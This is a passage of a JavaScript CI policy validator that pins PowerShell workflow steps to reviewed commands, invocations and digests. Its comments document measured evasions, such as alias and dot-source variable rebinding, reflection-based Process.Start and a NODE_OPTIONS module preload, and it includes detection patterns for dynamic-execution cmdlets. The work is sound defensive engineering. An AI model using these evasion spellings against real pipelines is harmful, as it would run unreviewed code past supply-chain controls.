  'System.Collections.Generic.List[string]::new',
  'System.Collections.Generic.SortedDictionary[string, string]::new',
  'System.Collections.Generic.Stack[string]::new',
  'System.Diagnostics.Process::new', 'System.Diagnostics.ProcessStartInfo::new',
  'System.IO.Directory::EnumerateFileSystemEntries', 'System.IO.Directory::Exists',
  'System.IO.Directory::GetFiles',
  'System.IO.File::Exists', 'System.IO.File::GetAttributes',
  'System.IO.File::OpenRead', 'System.IO.File::ReadAllBytes',
  'System.IO.FileAttributes::Directory', 'System.IO.FileAttributes::ReparsePoint',
  'System.IO.FileInfo::new', 'System.IO.MemoryStream::new',
  'System.IO.Path::Combine', 'System.IO.Path::DirectorySeparatorChar',
  'System.IO.Path::GetFileName',
  'System.Security.Cryptography.SHA256::Create',
  'System.StringComparer::Ordinal',
  'System.Text.Encoding::UTF8', 'System.Text.UTF8Encoding::new',
  'string::IsNullOrEmpty',
]);

// Round 54, found by re-running the round-53 batteries against the round-54
// fix rather than by report. Round 53 measured indirect writers reaching this
// step and left them, on the stated ground that the plain reassignment was
// open too, so closing the exotic spellings would have changed no outcome.
// The single-assignment rule above closed the plain form -- which retired that
// argument and made these live. Re-measured, all five accepted:
//
//   . sv strControlSurfaceBefore 'x'      & sv strControlSurfaceBefore 'x'
//   sv strControlSurfaceBefore 'x'        Set-Variable -Name ... -Value 'x'
//   Set-Item -Path 'variable:strControlSurfaceBefore' -Value 'x'
//
// None is an assignment, so none moved any count. Closed the way the generator
// and the Markdown steps already are, and with the same three-part shape: the
// invocation surface, the command-position surface, and the ban that reaches
// what neither of those sees.
const REVIEWED_VERIFY_INVOCATIONS = Object.freeze([
  ['$arrGeneratorResult = @(& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1)', 0],
]);
// Bytes, Error, ExitCode and string]]::new are not commands. The anchor treats
// the token after `(` or `=` as command position and they are listed rather
// than the anchor narrowed, for the reason the generator's list records:
// narrowing it would stop it seeing a command inside a subexpression.
const REVIEWED_VERIFY_COMMANDS = Object.freeze([
  'Assert-AllowedPathSet', 'ConvertFrom-Json', 'ConvertFrom-NulPathRecordStream',
  'Get-GitControlSurfaceDigest', 'Get-WorktreeFileDigestMap', 'Invoke-GitRaw',
  'New-Variable', 'Select-Object', 'Sort-Object', 'Where-Object',
  'Write-Information',
  'catch', 'else', 'finally', 'for', 'foreach', 'function', 'if', 'param',
  'return', 'throw', 'try', 'while',
  'Bytes', 'Error', 'ExitCode', 'string]]::new',
]);
// New-Variable stays on that list because the step legitimately uses it twice,
// to bind its two constants -- so it is pinned to exactly those two statements
// instead. Without this, the allowlist would have admitted
// `New-Variable -Name strControlSurfaceBefore -Value 'x' -Force`.
const REVIEWED_VERIFY_NEW_VARIABLE = Object.freeze([
  'New-Variable -Name strGitPath -Value $strResolvedGit -Option Constant',
  'New-Variable -Name arrChannelPaths -Value @($env:GITHUB_ENV, $env:GITHUB_PATH) -Option Constant',
]);

// Reviewed invocations carrying the brace depth each was reviewed at. Third
// site to need this shape, so it is one function: a line whose projection holds
// an invocation operator must be a reviewed line, in order, at its depth.
//
// The raw text is normalised here too, and that is load-bearing rather than
// tidiness. Found while reproducing the round-56 fold: a fold removes a newline,
// so a raw split has MORE lines than the projected split and every raw line
// after the first continuation is off by one. This read a comment as the
// invocation operand and rejected with a message naming it. Both sides have to
// be counted in the same units.
function assertReviewedInvocations(strRaw, strCode, arrReviewed, strCategory, strLabel) {
  const arrProjected = strCode.split('\n');
  const arrRawLines = normalizeLineContinuations(strRaw).split('\n');
  const arrObserved = [];
  let intLineStart = 0;
  for (let intIndex = 0; intIndex < arrProjected.length; intIndex += 1) {
    const intAt = invocationOperatorOffset(arrProjected[intIndex]);
    if (intAt >= 0) {
      arrObserved.push([(arrRawLines[intIndex] ?? '').trim(), powerShellBraceDepthAt(strCode, intLineStart + intAt)]);
    }
    intLineStart += arrProjected[intIndex].length + 1;
  }
  if (arrObserved.length !== arrReviewed.length) {
    reject(strCategory, `${strLabel} does not invoke exactly where it was reviewed to`);
  }
  for (let intIndex = 0; intIndex < arrReviewed.length; intIndex += 1) {
    const [strReviewedLine, intReviewedDepth] = arrReviewed[intIndex];
    const [strObservedLine, intObservedDepth] = arrObserved[intIndex];
    if (strObservedLine !== strReviewedLine) {
      reject(strCategory, `${strLabel} makes an unreviewed invocation: ${strObservedLine}`);
    }
    if (intObservedDepth !== intReviewedDepth) {
      reject(strCategory, `a reviewed invocation is no longer reachable where it was reviewed: ${strReviewedLine}`);
    }
  }
}

// A literal type, then a literal member name. Generic arguments are part of the
// type -- `[System.Collections.Generic.List[byte[]]]::new()` and
// `[...SortedDictionary[string, string]]::new()` both appear in reviewed code,
// and a pattern that stopped at the first `]` matched neither, which is how
// seven of the verify step's fifty static calls were invisible to its allowlist.
const STATIC_MEMBER_CALL =
  /\[\s*([A-Za-z_][A-Za-z0-9_.]*(?:\[[A-Za-z0-9_.,[\] \t]*\])?)\s*\]\s*::\s*([A-Za-z_][A-Za-z0-9_]*)/gu;

// Round 56, reported for one surface and measured on all five. `::` was
// constrained only where an allowlist happened to exist, and even there only on
// one side of the operator, so three walks past it were accepted:
//
//   [Type]::$strMember(...)   reported -- no literal member for the pattern to read
//   $typ = [Type]; $typ::M()  a type in a VARIABLE: no `]` for the pattern to anchor
//   [Generic[T]]::M()         a type the pattern could not parse, so never checked
//
// The first was reported against build.verify; measured, all three reach the
// generator and both Markdown steps as well, which had no `::` rule whatever.
//
// Enumerating those three spellings is the chase that lost in rounds 51, 53 and
// 55, so the FORM is closed instead: every `::` in the projection must be one of
// these well-formed literal calls. That is a count, so it has no spellings --
// anything that reaches a static member another way leaves a `::` the pattern
// cannot claim. Audited before shipping: on all five governed surfaces the total
// `::` count already equals the well-formed count (verify 50, generator 68,
// acquire 3, Markdown 10 and 9), so this refuses forms the reviewed sources
// never used rather than narrowing one they do.
//
// The allowlists that already exist keep running on top of this, and get the
// matches from here so they see the generic types too.
// One rule, but it still names what it found: rather than reporting that a count
// moved, it reports the `::` no well-formed call could claim, with its context.
// That keeps the single closure and the specific diagnostic together, instead of
// buying the message back by re-enumerating the shapes.
// Round 56, found attacking the closure above rather than reported -- and it
// matters because that closure cannot reach it: a Type OBJECT calls any static
// member through instance reflection, with no `::` anywhere in the code.
//
//   $typ = [System.Diagnostics.Process]        <- a type literal in VALUE position
//   $typ.GetMethod('Start').Invoke($null, @('pwsh', '-NoProfile -File ./p.ps1'))
//
// Measured both ways before believing it: in PowerShell the reflection really
// does call the method, and against the validator it was accepted on
// build.verify, the generator and both Markdown steps. `[System.Math].GetMethod`
// does the same with no variable at all.
//
// Enumerating reflection members would lose -- GetMethod, InvokeMember,
// GetField, and `$typ.$strName(...)` computes the member name anyway. So the
// type VALUE is refused rather than its uses: a type literal may be a static
// call or a cast, and may not be anything else. Audited across all five
// governed sources first -- 143 type literals, followed by exactly `::` (115),
// `$` (26) and `[` (2, both the `[void][System.IO.Directory]::CreateDirectory`
// cast chain). Not one is followed by `.` or by an expression end, so this
// refuses a form none of them uses rather than narrowing one they do.
function assertTypeLiteralsAreNotValues(strCode, strCategory, strLabel) {
  const setTypeLiteralEnd = new Set();
  for (let intAt = 0; intAt < strCode.length; intAt += 1) {
    if (strCode[intAt] !== '[') continue;
    // An index bracket follows a name, a call or an earlier index; a type
    // literal does not. Without this, $objWorktreeBefore[$strPath] reads as a
    // type. A `]` is the ambiguous one: it closes an index in `$a[0][1]` and a
    // cast in `[void][X]`, so it counts as a type only when the bracket it
    // closes was itself identified as one.
    const strBefore = strCode.slice(0, intAt).replace(/[ \t]+$/u, '');
    const strPrev = strBefore.slice(-1);
    if (/[A-Za-z0-9_)$]/u.test(strPrev)) continue;
    if (strPrev === ']' && !setTypeLiteralEnd.has(strBefore.length - 1)) continue;
    let intDepth = 0;
    let intEnd = intAt;
    for (; intEnd < strCode.length; intEnd += 1) {
      if (strCode[intEnd] === '[') intDepth += 1;
      else if (strCode[intEnd] === ']') { intDepth -= 1; if (intDepth === 0) break; }
    }
    if (intDepth !== 0) continue;
    // Trimmed before the test: `[ System.Math ]` is the same type, and testing
    // the untrimmed text would have skipped it as "not a type name" and handed
    // back the whole evasion.
    const strInner = strCode.slice(intAt + 1, intEnd).trim();
    if (!/^[A-Za-z_][A-Za-z0-9_.,[\] \t]*$/u.test(strInner)) continue;
    setTypeLiteralEnd.add(intEnd);
    if (!/^[:$@[]/u.test(strCode.slice(intEnd + 1).replace(/^[ \t]*/u, ''))) {
      reject(strCategory, `${strLabel} uses the type [${strInner}] as a value rather than as a static call or a cast`);
    }
  }
}

// The last way to a Type object once type literals may not be values: obtain one
// from a call instead. `[System.Type]::GetType('System.Diagnostics.Process')` is
// a perfectly well-formed literal static call, so both rules above pass it, and
// on the two surfaces that have no callee allowlist -- the generator and the
// Markdown steps -- it was the walk that survived my own fix.
//
// This is a capability ban rather than a closure, which this file otherwise
// argues against, and the distinction is that the capability is wanted nowhere:
// measured across all five governed sources, every one of these appears exactly
// zero times in code. Removing something none of them uses is the same move
// already made for New-Object and the network clients, not the spelling chase
// made for something they do. `Module` is deliberately absent from the list --
// it is the weakest route by far and would collide with a -Module parameter.
const REFLECTION_SURFACE =
  /\b(?:GetType|GetMethods?|InvokeMember|GetProperty|GetField|GetConstructor|GetMember|MakeGenericMethod|Activator|Reflection|Assembly|CreateInstance|TypeHandle)\b/iu;

function assertLiteralStaticCalls(strCode, strCategory, strLabel) {
  assertTypeLiteralsAreNotValues(strCode, strCategory, strLabel);
  if (REFLECTION_SURFACE.test(strCode)) {
    reject(strCategory, `${strLabel} reaches a member through reflection`);
  }
  const arrCalls = [...strCode.matchAll(STATIC_MEMBER_CALL)];
  const setClaimed = new Set(arrCalls.map((objCall) => objCall.index + objCall[0].indexOf('::')));
  for (const objAt of strCode.matchAll(/::/gu)) {
    if (!setClaimed.has(objAt.index)) {
      const strContext = strCode.slice(Math.max(0, objAt.index - 40), objAt.index + 16).replace(/\s+/gu, ' ').trim();
      reject(strCategory, `${strLabel} reaches a static member other than by naming a literal type and a literal member: ${strContext}`);
    }
  }
  return arrCalls;
}

// The generator's command-position surface, enumerated from the reviewed script.
//
// The indirect-writer ban below names cmdlets in full, which is the
// chase-spellings pattern this file criticises everywhere else -- and it was
// walked through immediately when I attacked it: `sv strGitPath 'git'` and
// `(gv strGitPath).Value = 'git'` both rebound the Git path and both were
// accepted, because sv and gv are documented aliases for Set-Variable and
// Get-Variable and neither name appears in the ban. Enumerating aliases would
// lose to the next one, so command position is closed positively instead, the
// way the Markdown steps already are.
//
// Mandatory, Heading and Lines are parameter names, not commands; the anchor
// treats the token after `(` as command position and they are listed rather
// than the anchor weakened, since narrowing it to exclude `(` would stop it
// seeing a command inside a subexpression.
const REVIEWED_GENERATOR_COMMANDS = Object.freeze([
  'Add-Type', 'Assert-OrdinaryAbsolutePath', 'Assert-OrdinaryPathComponent',
  'Assert-TrackedFile', 'ConvertFrom-StrictUtf8', 'ConvertTo-Json',
  'ConvertTo-LowerHex', 'ConvertTo-NormalizedUtf8', 'ForEach-Object',
  'Get-FileSha256Hex', 'Get-OrdinaryDestinationState',
  'Get-OrdinaryFileIdentity', 'Get-ScriptVersionRecord', 'Get-Sha256Hex',
  'Initialize-AtomicFileReplacementType', 'Initialize-WindowsFileIdentityType',
  'Join-Path', 'Microsoft.PowerShell.Core\\Get-Command', 'New-ArtifactRecord',
  'New-ChatPayload', 'New-CopilotPayload', 'New-FullPayload', 'New-Object',
  'New-StyleGuidePayloadMap', 'New-TerraformInstructionsPayload',
  'Set-StrictMode', 'stat', 'Test-FileSystemEntry', 'Test-PathContainedByRoot',
  'Test-PathTextIsSafe', 'Test-ScriptVersionParser', 'Where-Object',
  'Write-GeneratorResult', 'Write-StyleGuideArtifact', 'Write-Warning',
  // Control flow and declarations.
  'break', 'catch', 'continue', 'else', 'elseif', 'exit', 'finally', 'for',
  'foreach', 'function', 'if', 'param', 'return', 'throw', 'try', 'while',
  // Parameter names, as above.
  'AllowEmptyString', 'BuildDate', 'Heading', 'Justification', 'Lines', 'Major', 'Mandatory', 'Minor', 'Revision',
  'ArtifactId', 'Artifacts', 'CandidateLength', 'CandidateOrdinaryIdentity',
  'CandidateSha256', 'Category', 'CleanupResult', 'ExitCode', 'FinalLength',
  'FinalOrdinaryIdentity', 'FinalSha256', 'FinalState', 'GeneratorVersion',
  'NativeOutcome', 'OriginalLength', 'OriginalOrdinaryIdentity',
  'OriginalSha256', 'OriginalState', 'Overall', 'Path', 'Phase',
  'PublicationMethod', 'PublicationReturned', 'Schema', 'Status',
  'TemporaryDisposition', 'ValidateSet', 'Version', 'chat', 'copilot', 'full',
  'guide', 'rationale',
]);

// Round 53, reported. The command-position allowlist above closed bare command
// position and nothing else: the anchor has no `&` alternative, so `& sv
// strGitPath 'git'` was never compared against it at all. Measured accepted
// with the digest re-baselined, and confirmed in PowerShell to rebind the very
// variable the qualified lookup exists to protect -- the invocation site read
// `git` rather than `/usr/bin/git`.
//
// Adding `&` to that anchor would have closed the reported spelling and not the
// class: the anchor captures a token starting with a letter, so `& 'sv' ...`
// and `& ("s" + "v") ...` still evade it, and both were measured to rebind. So
// the call-operator surface is closed the way the Markdown steps' already is --
// totally. The reviewed generator contains exactly one `&`. Every occurrence in
// the projection must be this line, at this depth, this many times, which
// leaves no second call operator for any spelling to occupy.
//
// Raw line rather than parsed operand: two earlier rounds were lost to rules
// that had to understand PowerShell's grammar to say what an argument was.
// Which lines invoke is decided on the projection, so a `&` in a comment or a
// string is not one; the text compared is the raw line, so nothing hides in
// what the projection blanks.
const REVIEWED_GENERATOR_INVOCATIONS = Object.freeze([
  ["$arrStatOutput = @(& stat '-f' '%l:%d:%i' $LiteralPath)", 2],
  ["$arrStatOutput = @(& stat '-Lc' '%h:%d:%i' '--' $LiteralPath)", 2],
  ['$arrOutput = @(& $strGitPath -C $RepositoryRoot ls-files --error-unmatch -- $RepositoryPath 2>$null)', 1],
]);

// Round 53, reported as the second half of the same defect. The Git-path
// assignment count recognised `$strGitPath` and `${strGitPath}` only, so
// `$local:strGitPath = 'git'` added a second binding the count never saw.
// Measured accepted; measured in PowerShell to rebind.
//
// Normalising a list of scope modifiers into that count is the losing move
// again -- `local`, `private` and `variable` all rebind, `${local:...}` is a
// fourth spelling, and the modifier is matched case-insensitively by
// PowerShell, so `$LOCAL:` is a fifth. Measured: all five accepted.
//
// So the qualifier is closed as a class instead. The reviewed generator
// contains exactly one qualified assignment target. Any other -- any modifier,
// any case, braced or bare, including a *second* write to the reviewed one --
// is refused without naming a single modifier.
//
// $script: and $global: are deliberately absent from the finding rather than
// listed as further instances: measured, neither rebinds a function-local
// variable, so a report claiming them would have been wrong.
const REVIEWED_GENERATOR_QUALIFIED_ASSIGNMENTS = Object.freeze([
  'script:strGeneratorVersion',
  'script:strGeneratorResultSchema',
  'script:objUtf8Strict',
  'script:objUtf8NoBom',
  'script:boolHostIsWindows',
  'script:objPathComparison',
]);

// The other invocation operator. Found by attacking the call-operator closure
// immediately after writing it: `. sv strGitPath 'git'` was still accepted, and
// dot-sourcing runs its target in the *current* scope, so it rebinds exactly as
// `&` does -- confirmed in PowerShell, invocation site read `git`. Closing `&`
// and leaving `.` would have been the reported-instance fix all over again.
//
// The operator must sit where a statement may begin and be followed by
// whitespace, which is what separates it from method calls, property access and
// relative paths. Audited across every governed surface -- the generator, both
// Markdown steps, both acquire steps and both build steps -- and it matches
// nothing in any of them, so the reviewed count is zero everywhere it is used.
const DOT_SOURCE = /(?:^[ \t]*|[;{}|=(,][ \t]*|&&[ \t]*|\|\|[ \t]*)\.(?=[ \t])/gmu;

// A qualified variable write in either spelling PowerShell accepts. The
// qualifier and name are captured exactly; comparison is against a reviewed
// list, so case folding needs no special handling -- a spelling that is not
// character-for-character reviewed is not reviewed.
const QUALIFIED_ASSIGNMENT = /\$(?:\{([A-Za-z_][A-Za-z0-9_]*:[A-Za-z_][A-Za-z0-9_]*)\}|([A-Za-z_][A-Za-z0-9_]*:[A-Za-z_][A-Za-z0-9_]*))[ \t]*(?:\+|-|\*|\/|%)?=(?!=)/gu;

// Round 52. The generator's dispatch tail, as an ordered sequence of exact
// statements rather than a wildcard family. Each must appear once, in this
// order, at brace depth zero, and the terminal exit must follow all of them.
// Naming the callees exactly is the point: the previous family pattern accepted
// four calls to a no-op function of a matching name.
const REVIEWED_GENERATOR_DISPATCH = Object.freeze([
  '$intCopilotResult = New-StyleGuideCopilotVersion -SourcePath $strSourceFile -DestinationPath $strCopilotFile',
  'if ($intCopilotResult -ne 0) {',
  '$intTerraformInstructionsResult = New-StyleGuideTerraformInstructionsVersion -SourcePath $strSourceFile -DestinationPath $strTerraformInstructionsFile',
  'if ($intTerraformInstructionsResult -ne 0) {',
  '$intChatResult = New-StyleGuideChatVersion -SourcePath $strSourceFile -DestinationPath $strChatFile',
  'if ($intChatResult -ne 0) {',
  '$intFullResult = New-StyleGuideFullVersion -SourcePath $strSourceFile -RationalePath $strRationaleFile -DestinationPath $strFullFile',
  // The result checks are part of the sequence, not a separate list: a
  // dispatch whose failure is ignored is a dispatch that did not happen.
  'if ($intFullResult -ne 0) {',
]);

// Everything the generator is reviewed to do after that last statement, with
// whitespace collapsed. The Write-Information message is a pair of quotes because the
// projection blanks string content -- which is correct here: what the script
// prints on success is not a policy input, and pinning it would make an
// innocuous wording change a policy failure.
const REVIEWED_GENERATOR_TAIL = 'exit 1 } Write-Information " " -InformationAction Continue exit 0';

// Round 51. The generator's safety assertions, with the number of times each
// must appear. Every one of these was deleted or neutered in a measured battery
// that the policy accepted, because until now only command *resolution* was
// named here and behaviour was left entirely to the digest -- which the threat
// model these rules exist for assumes has been re-baselined.
const REVIEWED_GENERATOR_GUARDS = Object.freeze([
  // The identity check a previous round asked to be kept. It was deletable.
  ['Assert-StyleGuideTrackedDestination -DestinationLeaf $strDestinationLeaf', [2]],
  ['if ($intGitExit -ne 0 -or $arrTrackedPath.Count -ne 1 -or $arrTrackedPath[0] -cne $DestinationLeaf) {', [1]],
  // Reparse-point and filesystem-type checks, on the root and on the sibling.
  ['Assert-StyleGuideOrdinaryPath -LiteralPath $script:strRepositoryRoot -ExpectedType', [2, 2]],
  ['Assert-StyleGuideOrdinaryPath -LiteralPath $strTemporaryPath -ExpectedType', [2, 2, 4]],
  // Whole conditions, not just the comparisons. A fragment naming only the
  // comparison survives `if ($false -and <comparison>)` -- the check is
  // disabled and the text is still there. Measured: that spelling passed the
  // first version of this list and was caught only by the digest.
  // What makes the written bytes the bytes that were verified.
  ['if ($strObservedSha256 -cne $strExpectedSha256) {', [2]],
  ['if ($arrObservedBytes -contains 0x0D) {', [2]],
  // The two atomic publish paths: replace an existing artifact, create a
  // missing one. Neither may be swapped for a non-atomic write.
  ['[System.IO.File]::Replace($strTemporaryPath, $strExpectedPath, [NullString]::Value)', [3]],
  ['[System.IO.File]::Move($strTemporaryPath, $strExpectedPath)', [3]],
  // Same sweep. The provider check is listed for consistency rather than risk:
  // PowerShell resolves provider names case-insensitively, so folding it
  // changes nothing at runtime. The rollback verification is the one that
  // matters here.
  ['if ($null -eq $objProvider -or $objProvider.Name -cne ', [2]],
  ['if ($objCurrentInfo.Length -ne $intOriginalLength -or $strCurrentSha256 -cne $strOriginalSha256) {', [4]],
]);
const REVIEWED_GENERATOR_DIGEST = '596ad6d6988b91bc3009ca3efbd74216a1768b735e2fdced5a9d9370ac784d82';

// The lint phases execute these two files out of the checkout. The rule
// configuration decides which rules run at all, and the nested-fence helper is
// the entirety of the second phase, yet the reviewed package digests cover only
// what npm installs. Editing either leaves every command string, captured
// status, and digest intact while both phases report zero errors over nothing,
// so what the lint does is pinned alongside what it runs.
const REVIEWED_LINT_DIGESTS = Object.freeze({
  '.markdownlint.jsonc': '5eb07bf7f30829e0091e82f235a96fdba21be1ef1160ca1e22cdbe8d82da5300',
  'lint-nested-markdown.js': '4eefec7afba1c79809d916365b2eb3e2ea17aa482593338492a10d6dda5e2031',
});

// Round 45, finding C. The invocation allowlist below records only lines whose
// projection contains &, so a command run bare -- no call operator -- was never
// compared against it. Measured with the policy step's digest re-baselined:
// `npm run ('lint:' + 'md')` was accepted, and because the step has already put
// the reviewed Node bin directory on PATH, that is installed package code
// running before the validator in the job whose whole purpose is to run nothing
// of the sort.
//
// So bare command position is closed the same way the call operator already is:
// by naming what may appear there. These are the only two lists, and both jobs
// share them because the enumerated surface of the two steps is identical --
// five cmdlets and six control keywords, verified against both step bodies.
// Cmdlets are named rather than shape-matched: a Verb-Noun test would admit
// Set-Item, Set-Variable, New-Item and Invoke-Expression, which is the whole
// class this is meant to exclude.
const MARKDOWN_STEP_COMMANDS = Object.freeze([
  'Get-Content', 'Get-FileHash', 'Remove-Item', 'Test-Path', 'Write-Host',
]);
// Control flow, not commands. catch and trap are absent deliberately -- both are
// refused outright by an earlier rule -- as are function, param and return,
// none of which these steps use.
const MARKDOWN_STEP_KEYWORDS = Object.freeze([
  'if', 'elseif', 'else', 'foreach', 'for', 'while', 'do', 'switch',
  'try', 'finally', 'throw', 'break', 'continue',
]);
// A token is in command position at the start of a line, or directly after one
// of ; { } | = ( , or a && / || operator. Anchored the same way the acquire
// step's dot-source scan is, and for the same reason: without an anchor the
// names collide with ordinary text. Tokens beginning $ [ @ ' " - or a digit are
// not command names and are not captured.
//
// Round 46: an opening brace preceded by $ is excluded, because ${name} is a
// variable reference and its interior is not command position. Without that
// exclusion the scan captured `env:NODE_OPTIONS` out of `${env:NODE_OPTIONS} =`
// and reported a braced *assignment* as a bare command -- which happened to
// reject the right line for the wrong reason, and would have misreported any
// legitimate ${strName} the same way. An opening parenthesis is deliberately
// still an anchor after $, because $(...) is a subexpression and a command
// inside one is a command.
const MARKDOWN_COMMAND_POSITION = /(?:^[ \t]*|(?<!\$)\{[ \t]*|[;}|=(,][ \t]*|&&[ \t]*|\|\|[ \t]*)([A-Za-z_.\/\\][^\s;{}()]*)/gmu;
// Both spellings of an Env: provider write. PowerShell accepts $env:NAME and
// ${env:NAME}, and resolves the provider name case-insensitively, so the prefix
// matches either case while the variable name is captured exactly -- the name
// is what the allowlist compares, and on Linux it is case-sensitive.
// Round 55: every assignment operator, not just `=` and `+=`. Measured --
// `$env:NODE_OPTIONS ??= '--require=./payload.cjs'` assigns the preload when
// the variable is unset and was invisible to the `+?=` form.
const MARKDOWN_ENV_WRITE = /\$\{?env:([A-Za-z_][A-Za-z0-9_]*)\}?[ \t]*(?:\+|-|\*|\/|%|\?\?)?=/giu;
// Round 46. Execution APIs reachable without a call operator and without a bare
// command name, so neither the invocation allowlist nor the command-position
// scan can see them. Measured: [System.Diagnostics.Process]::Start($strNpmPath,
// ('run lint:' + 'md')) was accepted, and the assembled argument also slips the
// raw-text separation rule. The same list the acquire steps already refuse, for
// the same reason -- neither governed step contains any of these today, so this
// removes a capability rather than narrowing one.
const MARKDOWN_DYNAMIC_EXECUTION = /\b(?:Invoke-Expression|iex|Invoke-Command|icm|Start-Process|saps)\b|\[\s*(?:System\.)?Management\.Automation\.ScriptBlock\s*\]|\[\s*scriptblock\s*\]\s*::\s*Create|\$ExecutionContext\s*\.\s*InvokeCommand|(?:System\.)?Diagnostics\.Process/iu;

// Command position in the generator. Same anchor as the Markdown steps use,
// including the exclusion of ${...} interiors added in round 49.
const GENERATOR_COMMAND_POSITION = /(?:^[ \t]*|(?<!\$)\{[ \t]*|[;}|=(,][ \t]*|&&[ \t]*|\|\|[ \t]*)([A-Za-z_][^\s;{}()]*)/gmu;

// The reviewed shape of each governed step, side by side so the two jobs can be
// compared at a glance. The preludes are identical and asserted to be; only the
// tails differ, and each tail is asserted to contain neither the other job's
// program nor the other job's phases. That is the split: the policy job runs
// the validator and no linter, the lint job runs both linters and no validator,
// and neither can reach the bytes the other reads.
const MARKDOWN_JOBS = Object.freeze({
  policy: Object.freeze({
    stepId: 'validate',
    name: 'Install without executing packages and validate workflow policy',
    digest: REVIEWED_POLICY_STEP_DIGEST,
    // Round 45, finding B. Every environment variable this step assigns, and
    // nothing else. NODE_OPTIONS is the one that motivated the rule -- Node
    // documents its contents as interpreted before the command line, so
    // `$env:NODE_OPTIONS = '--require=./payload.cjs'` preloads a
    // checkout-controlled module into the validator process, and a preload that
    // exits zero only when process.argv[1] names the validator leaves every
    // other assertion here untouched. Measured accepted before this list
    // existed. An allowlist rather than a NODE_OPTIONS ban, because the same
    // shape is available through NODE_PATH, npm_config_* and LD_PRELOAD, and
    // naming the bad ones has lost to the next spelling every time on this
    // branch.
    envWrites: Object.freeze([
      'CI', 'PATH', 'T1_EXPECTED_BUILD_DIGEST', 'T1_EXPECTED_MARKDOWN_DIGEST',
      'npm_config_globalconfig', 'npm_config_userconfig',
    ]),
    capturedStatuses: Object.freeze(['intNodeVersionExit', 'intNpmVersionExit', 'intInstallExit', 'intPolicyExit']),
    invocations: Object.freeze([
      '$strNodeVersion = (& $strNodePath --version).Trim()',
      '$strNpmVersion = (& $strNpmPath --version).Trim()',
      '& $strNpmPath ci --ignore-scripts --no-audit --no-fund',
      '& $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml',
    ]),
    fragments: Object.freeze([
      './Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml',
      '$env:T1_EXPECTED_BUILD_DIGEST = (Get-FileHash -LiteralPath ./build.yml -Algorithm SHA256).Hash',
      '$env:T1_EXPECTED_MARKDOWN_DIGEST = (Get-FileHash -LiteralPath ./markdownlint.yml -Algorithm SHA256).Hash',
      'validation: package metadata changed after installation',
      'validation: workflow policy validation failed',
      // Case-sensitive comparisons the round-52 sweep found unpinned. Both
      // sides are same-source hex, so folding is a weakening rather than a
      // shown bypass; pinned because the text is already reviewed and the
      // check costs nothing.
      'if ($strPackageAfterInstall -cne $strPackageBefore -or $strLockAfterInstall -cne $strLockBefore) {',
      'if ($strPackageFinal -cne $strPackageBefore -or $strLockFinal -cne $strLockBefore) {',
    ]),
    phases: Object.freeze([
      'supply: package metadata does not match the reviewed supply digest',
      // Must precede installation: npm reads .npmrc before it runs any command.
      'supply: repository-controlled npm configuration is present',
      // Recorded before installation, so the baseline predates every file npm
      // unpacks into this job. Handed to the validator rather than re-compared
      // here, because a comparison immediately before the invocation is a
      // check/use pair with an interval in it while hashing the parsed text has
      // none.
      '$env:T1_EXPECTED_BUILD_DIGEST = (Get-FileHash -LiteralPath ./build.yml -Algorithm SHA256).Hash',
      '$env:T1_EXPECTED_MARKDOWN_DIGEST = (Get-FileHash -LiteralPath ./markdownlint.yml -Algorithm SHA256).Hash',
      'ci --ignore-scripts --no-audit --no-fund',
      'npm-ci: package metadata changed during frozen installation',
      // --ignore-scripts unpacks the dependency tree without executing any of
      // it, and this job contains no lint phase, so nothing has run here that
      // could have replaced the extracted toolchain or the validator's bytes.
      './Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml',
      'validation: package metadata changed after installation',
      'validation: workflow policy validation failed',
    ]),
  }),
  markdownlint: Object.freeze({
    stepId: 'lint',
    name: 'Install and lint both Markdown surfaces',
    digest: REVIEWED_LINT_STEP_DIGEST,
    // Shorter than the policy job's by exactly the two digest baselines, which
    // only the step that hands them to the validator records.
    envWrites: Object.freeze([
      'CI', 'PATH', 'npm_config_globalconfig', 'npm_config_userconfig',
    ]),
    capturedStatuses: Object.freeze(['intNodeVersionExit', 'intNpmVersionExit', 'intInstallExit', 'intOuterExit', 'intNestedExit']),
    invocations: Object.freeze([
      '$strNodeVersion = (& $strNodePath --version).Trim()',
      '$strNpmVersion = (& $strNpmPath --version).Trim()',
      '& $strNpmPath ci --ignore-scripts --no-audit --no-fund',
      '& $strNpmPath run lint:md',
      '& $strNpmPath run lint:md:nested',
    ]),
    fragments: Object.freeze([
      'run lint:md',
      'run lint:md:nested',
      // What the lint does, not only what it runs. Derived from the reviewed
      // constants so the gate and this baseline cannot drift apart silently.
      REVIEWED_LINT_DIGESTS['.markdownlint.jsonc'].toUpperCase(),
      REVIEWED_LINT_DIGESTS['lint-nested-markdown.js'].toUpperCase(),
      'Get-FileHash -LiteralPath .markdownlint.jsonc -Algorithm SHA256',
      'Get-FileHash -LiteralPath lint-nested-markdown.js -Algorithm SHA256',
      'supply: lint configuration or helper does not match the reviewed digest',
      'supply: lint configuration or helper changed during installation',
      'validation: package metadata changed after installation or linting',
      'validation: one or more lint phases failed',
      // Appended last, deliberately. These are case-fold guards; placing them
      // ahead of the existing fragments would make an unrelated fixture that
      // deletes a whole gate report through one of these instead of through the
      // message it was written for.
      'if ($strLintConfigHash -cne $strReviewedLintConfigHash -or $strLintHelperHash -cne $strReviewedLintHelperHash) {',
      'if ($strLintConfigAfterInstall -cne $strReviewedLintConfigHash -or $strLintHelperAfterInstall -cne $strReviewedLintHelperHash) {',
      'if ($strPackageAfterInstall -cne $strPackageBefore -or $strLockAfterInstall -cne $strLockBefore) {',
      'if ($strPackageFinal -cne $strPackageBefore -or $strLockFinal -cne $strLockBefore) {',
    ]),
    phases: Object.freeze([
      'supply: package metadata does not match the reviewed supply digest',
      'supply: repository-controlled npm configuration is present',
      // Must precede the lint phases, which execute both of these files.
      'supply: lint configuration or helper does not match the reviewed digest',
      'ci --ignore-scripts --no-audit --no-fund',
      'npm-ci: package metadata changed during frozen installation',
      // Between installation and the phases that read these two files, with
      // nothing repository-controlled in between: npm ci unpacks with
      // --ignore-scripts, and the validator that used to run in this job now
      // runs on a different machine entirely.
      'supply: lint configuration or helper changed during installation',
      'run lint:md\n',
      'run lint:md:nested',
      'validation: package metadata changed after installation or linting',
      'validation: one or more lint phases failed',
    ]),
  }),
});

const EXPECTED_VERSION = '1.0.20260818.1';
const PREFLIGHT_ARGUMENT = '--preflight';
